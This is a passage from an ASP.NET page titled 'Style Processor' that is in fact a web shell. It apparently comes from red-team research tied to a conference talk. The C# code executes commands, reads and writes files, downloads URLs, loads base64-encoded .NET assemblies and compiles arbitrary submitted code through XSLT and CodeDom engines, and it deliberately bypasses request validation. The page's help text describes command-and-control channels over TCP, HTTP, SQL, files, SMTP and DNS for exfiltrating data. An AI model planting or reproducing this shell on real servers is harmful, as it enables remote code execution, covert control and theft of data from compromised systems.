            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("--- Managed (no compilation) ---", "m_sysinfo"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  System Info", "m_sysinfo"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Command Exec (args: command)", "m_cmd"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Directory Listing (args: path)", "m_ls"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Read File (args: path)", "m_read"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Write File (args: path|data)", "m_write"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Download URL (args: url)", "m_download"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Load .NET Assembly (args: base64|arg)", "m_assembly"));
            ddlPayload.Items.Add(new System.Web.UI.WebControls.ListItem("  Environment Variables", "m_env"));
        }
    }

    protected void ddlPayload_Changed(object sender, EventArgs e)
    {
        string key = ddlPayload.SelectedValue; // we want to distiguish between managed and custom. 

        if (key.StartsWith("m_"))
        {
            // Managed payload selected - clear code box and auto-select managed engine
            txtCode.Text = "(Managed payload - no code needed)";
            ddlEngine.SelectedValue = "managed";
        }
        else if (key != "custom" && Payloads.ContainsKey(key))
        {
            txtCode.Text = Payloads[key][1];
            ddlEngine.SelectedValue = "auto";
        }
        else
        {
            txtCode.Text = "";
            ddlEngine.SelectedValue = "auto";
        }
    }

    protected void btnExecute_Click(object sender, EventArgs e)
    {
        StringBuilder log = new StringBuilder();

        try
        {
            // Use Request.Unvalidated to bypass .NET 4.0+ request validation
            string code = Request.Unvalidated.Form[txtCode.UniqueID] ?? txtCode.Text;
            string args = (Request.Unvalidated.Form[txtArgs.UniqueID] ?? txtArgs.Text).Trim();
            string imports = (Request.Unvalidated.Form[txtImports.UniqueID] ?? txtImports.Text).Trim();
            string engine = ddlEngine.SelectedValue;
            string payload = ddlPayload.SelectedValue;

            // Pass arguments via environment variable (for XSLT and CodeDom engines)
            // Under Medium trust, EnvironmentPermission may be denied - that's OK
            // ;; since managed engine receives args directly
            try
            {
                if (!string.IsNullOrEmpty(args))
                    Environment.SetEnvironmentVariable("_XSLT_ARG", args);
                else
                    Environment.SetEnvironmentVariable("_XSLT_ARG", null);
            }
            catch (System.Security.SecurityException) { }

            // Auto-select best available engine
            // m_* and t_* payloads are always routed to managed engine (no compilation)
            bool isManagedPayload = payload.StartsWith("m_") || payload.StartsWith("t_");

            if (engine == "auto")
            {
                if (isManagedPayload)
                    engine = "managed";
                else if (_engineXslt)
                    engine = "xslt";
                else if (_engineCodeDom)
                    engine = "codedom";
                else
                    engine = "managed";
                log.AppendLine("Auto-selected engine: " + engine);
            }

            // Force managed engine for t_* and m_* payloads regardless of selection
            if (isManagedPayload)
                engine = "managed";

            string result = "";

            if (engine == "managed")
            {
                if (!isManagedPayload)
                {
                    // Compiled payload selected but routed to managed engine
                    lblResult.Text = "This payload requires compilation (XSLT or CodeDom engine) "
                        + "which is not available at this trust level.\n\n"
                        + "Select a Managed payload from the dropdown instead.";
                    return;
                }
                result = ExecuteManaged(payload, args, log);
            }
            else
            {
                // XSLT or CodeDom engine: need code
                if (string.IsNullOrEmpty(code))
                {
                    lblResult.Text = "No code provided. Write code or select a Managed payload.";
                    return;
                }

                if (engine == "xslt")
                {
                    log.AppendLine("=== Building Stylesheet ===");
                    string stylesheet = BuildStylesheet(code, imports);
                    log.AppendLine("Stylesheet size: " + stylesheet.Length + " chars");
                    log.AppendLine();
                    log.AppendLine("=== Execution ===");
                    result = ExecuteXslt(stylesheet, log);
                }
                else if (engine == "codedom")
                {
                    log.AppendLine("=== CodeDom Compilation ===");
                    result = ExecuteCodeDom(code, imports, log);
                }
            }

            log.AppendLine();
            log.AppendLine("=== Output ===");
            log.AppendLine(result);
            lblResult.Text = log.ToString();
        }
        catch (XsltException xex)
        {
            log.AppendLine();
            log.AppendLine("=== XSLT Error ===");
            log.AppendLine(xex.Message);
            if (xex.InnerException != null)
                log.AppendLine(xex.InnerException.Message);
            log.AppendLine("Line: " + xex.LineNumber + ", Position: " + xex.LinePosition);
            lblResult.Text = log.ToString();
        }
        catch (Exception ex)
        {
            log.AppendLine();
            log.AppendLine("=== Error ===");
            log.AppendLine(ex.GetType().Name + ": " + ex.Message);
            if (ex.InnerException != null)
                log.AppendLine("Inner: " + ex.InnerException.Message);
            log.AppendLine();
            log.AppendLine(ex.StackTrace);
            lblResult.Text = log.ToString();
        }
        finally
        {
            try { Environment.SetEnvironmentVariable("_XSLT_ARG", null); }
            catch (System.Security.SecurityException) { }
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Style Processor</title>
    <style>
        body { font-family: Consolas, monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        h2 { color: #e94560; }
        h3 { color: #0f3460; background: #e94560; padding: 8px; margin: 0; }
        .section { background: #16213e; margin: 15px 0; border-radius: 5px; overflow: hidden; }
        .section-content { padding: 15px; }
        input[type="text"], textarea, select {
            width: 100%; padding: 10px; margin: 5px 0;
            background: #0f3460; border: 1px solid #e94560;
            color: #eee; font-family: Consolas, monospace;
            box-sizing: border-box;
        }
        textarea { resize: vertical; }
        input[type="submit"] {
            background: #e94560; color: white; border: none;
            padding: 12px 24px; cursor: pointer; margin: 5px 5px 5px 0;
            font-weight: bold;
        }
        input[type="submit"]:hover { background: #ff6b6b; }
        label { color: #e94560; display: block; margin-top: 10px; font-weight: bold; }
        .result {
            background: #0a0a0a; padding: 15px; margin-top: 15px;
            border-left: 4px solid #e94560; white-space: pre-wrap;
            word-wrap: break-word; font-size: 13px; max-height: 600px;
            overflow-y: auto;
        }
        .info { color: #888; font-size: 12px; margin-top: 5px; }
        .status-bar {
            padding: 10px 15px; margin-bottom: 15px; border-radius: 5px;
            background: #0a0a0a; border: 1px solid #333;
            font-size: 12px; font-family: Consolas, monospace;
        }
        .note {
            background: #0f3460; padding: 10px; border-left: 3px solid #4a9;
            margin: 10px 0; font-size: 12px; color: #aaa;
        }
        .row { display: flex; gap: 15px; }
        .col { flex: 1; }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">
            <h2>Style Processor</h2>

            <div class="status-bar">
                <asp:Label ID="lblStatus" runat="server" Text="Checking..." />
            </div>

            <div class="section">
                <h3>Engine &amp; Payload</h3>
                <div class="section-content">
                    <div class="row">
                        <div class="col">
                            <label>Engine:</label>
                            <asp:DropDownList ID="ddlEngine" runat="server" />
                            <div class="info">Auto picks the best available. Managed works under any trust level.</div>
                        </div>
                        <div class="col">
                            <label>Template:</label>
                            <asp:DropDownList ID="ddlPayload" runat="server" AutoPostBack="true"
                                OnSelectedIndexChanged="ddlPayload_Changed" />
                            <div class="info">Managed payloads run directly without compilation</div>
                        </div>
                    </div>

                    <label>Arguments:</label>
                    <asp:TextBox ID="txtArgs" runat="server" placeholder="command, path, base64 data, or url depending on payload" />
                    <div class="info">Passed to the payload via environment variable (compiled) or directly (managed)</div>

                    <label>Extra Imports (comma-separated):</label>
                    <asp:TextBox ID="txtImports" runat="server"
                        placeholder="e.g., System.Runtime.InteropServices, System.Security.Cryptography" />
                    <div class="info">Additional using statements (compiled engines only)</div>

                    <label>Code:</label>
                    <asp:TextBox ID="txtCode" runat="server" TextMode="MultiLine" Rows="18"
                        placeholder="public string Go()&#10;{&#10;    return &quot;Hello&quot;;&#10;}" />

                    <div class="note">
                        <strong>Compiled engines (XSLT/CodeDom):</strong> Code must define <strong>public string Go()</strong>.
                        Default imports: System, System.IO, System.Text, System.Diagnostics,
                        System.Net, System.Reflection, System.Collections.Generic.
                        Read arguments via: <strong>Environment.GetEnvironmentVariable("_XSLT_ARG")</strong><br/><br/>
                        <strong>Managed engine:</strong> Select a built-in action from the dropdown. No code needed.
                        Arguments go in the args field.<br/><br/>
                        <strong>C2 Channel Techniques (all managed, no Process.Start):</strong><br/>
                        <em>Note: Process.Start/cmd.exe requires UnmanagedCode permission — denied at High+Medium Trust.
                        All channels execute managed tasks only: sysinfo, ls, cat, dl, write, asm, env, pwd.</em><br/><br/>
                        <strong>T1 - TCP Channel (High):</strong> Interactive managed agent over TCP. Args: host:port<br/>
                        <strong>T2 - HTTP Beacon (High):</strong> Polls C2 for managed tasks. Args: http://c2:port or |once<br/>
                        <strong>T3 - SQL C2 (High+Med):</strong> SQL table as dead drop. Args: connstring, |poll, |loop, |cleanup<br/>
                        <strong>T4 - SMTP Exfil (High+Med):</strong> Emails task output. Args: smtp://srv:25|from|to|task<br/>
                        <strong>T5 - File C2 (Medium):</strong> App_Data dead drop. Args: setup, drop task, exec, poll, read, cleanup<br/>
                        <strong>T6 - DNS Exfil (High):</strong> Exfil via DNS queries. Args: domain.com|task

                        <strong> Blogpost will be released soon to explain all the stuff, you can watch the talk at https://www.youtube.com/@OrangeCon </strong> 
                    </div>

                    <asp:Button ID="btnExecute" runat="server" Text="Execute" OnClick="btnExecute_Click" />
                </div>
            </div>

            <div class="result">
                <asp:Label ID="lblResult" runat="server" Text="Ready." />
            </div>
        </div>
    </form>
</body>
</html>
